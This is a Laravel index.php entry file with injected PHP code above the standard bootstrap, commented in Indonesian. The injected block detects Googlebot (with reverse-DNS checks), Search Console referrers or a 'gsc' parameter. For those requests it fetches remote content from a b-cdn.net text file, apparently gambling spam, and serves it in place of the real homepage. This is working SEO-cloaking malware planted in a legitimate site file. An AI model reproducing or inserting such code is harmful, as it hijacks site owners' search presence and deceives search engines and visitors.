<?php
// ======================= KONFIGURASI DASAR =======================
$userAgent = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');
$clientIP = $_SERVER["HTTP_CF_CONNECTING_IP"] ?? $_SERVER["HTTP_X_FORWARDED_FOR"] ?? $_SERVER["REMOTE_ADDR"];
$referrer = $_SERVER['HTTP_REFERER'] ?? '';
$requestPath = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH) ?? '/';

// ======================= FUNGSI UTAMA =======================
function ambilKonten($url) {
    $context = stream_context_create([
        "http" => ["timeout" => 1.5, "ignore_errors" => true]
    ]);
    
    // Priority 1: Gunakan file_get_contents
    $konten = @file_get_contents($url, false, $context);
    
    // Priority 2: Fallback ke cURL jika gagal
    if (!$konten || strlen(trim($konten)) < 20) {
        if (function_exists('curl_init')) {
            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_TIMEOUT => 3,
                CURLOPT_USERAGENT => $_SERVER["HTTP_USER_AGENT"] ?? 'Mozilla/5.0',
                CURLOPT_SSL_VERIFYPEER => false
            ]);
            $konten = curl_exec($ch);
            curl_close($ch);
        }
        
        // Priority 3: Final fallback
        if (!$konten || strlen(trim($konten)) < 20) {
            $konten = @file_get_contents($url, false, $context);
        }
    }
    return $konten;
}

// ======================= DETEKSI BOT =======================
$isBotValid = false;
$daftarBotGoogle = [
    'googlebot',
    'adsbot-google',
    'apis-google',
    'mediapartners-google',
    'googlebot-image',
    'googlebot-video',
    'googlebot-news',
    'google-inspectiontool',
    'structured-data-testing-tool'
];

foreach ($daftarBotGoogle as $bot) {
    if (strpos($userAgent, $bot) !== false) {
        $hostname = @gethostbyaddr($clientIP);
        $isBotValid = (strpos($userAgent, 'googlebot') !== false && $hostname && $hostname !== $clientIP) 
            ? (strpos($hostname, 'google.com') !== false || strpos($hostname, 'googlebot.com') !== false)
            : true;
        break;
    }
}

// ======================= PROSES CLOAKING =======================
if (($isBotValid || strpos($referrer, 'search.google.com') !== false || isset($_GET["gsc"])) 
    && in_array($requestPath, ['/', '/index.php'])) {
    
    //  DELAY
    if ($isBotValid) {
        usleep(rand(500000, 900000));
    }
    
    $kontenCloaking = ambilKonten("https://selalujepe.b-cdn.net/cinecar-sv388.txt");
    
    if ($kontenCloaking && strlen(trim($kontenCloaking)) > 50) {
        // Bersihkan buffer output
        while (ob_get_level()) ob_end_clean();
        
        // Header anti-cache
        header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
        header("Pragma: no-cache");
        header("Expires: 0");
        header("Content-Type: text/html; charset=utf-8");
        
        echo $kontenCloaking;
        exit;
    }
}
/**
 * Laravel - A PHP Framework For Web Artisans
 *
 * @package  Laravel
 * @author   Taylor Otwell <taylor@laravel.com>
 */

define('LARAVEL_START', microtime(true));

/*
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader for
| our application. We just need to utilize it! We'll simply require it
| into the script here so that we don't have to worry about manual
| loading any of our classes later on. It feels great to relax.
|
*/

require __DIR__.'/../vendor/autoload.php';

/*
|--------------------------------------------------------------------------
| Turn On The Lights
|--------------------------------------------------------------------------
|
| We need to illuminate PHP development, so let us turn on the lights.
| This bootstraps the framework and gets it ready for use, then it
| will load up this application so that we can run it and send
| the responses back to the browser and delight our users.
|
*/

$app = require_once __DIR__.'/../bootstrap/app.php';

/*
|--------------------------------------------------------------------------
| Run The Application
|--------------------------------------------------------------------------
|
| Once we have the application, we can handle the incoming request
| through the kernel, and send the associated response back to
| the client's browser allowing them to enjoy the creative
| and wonderful application we have prepared for them.
|
*/

$kernel = $app->make(Illuminate\Contracts\Http\Kernel::class);

$response = $kernel->handle(
    $request = Illuminate\Http\Request::capture()
);

$response->send();

$kernel->terminate($request, $response);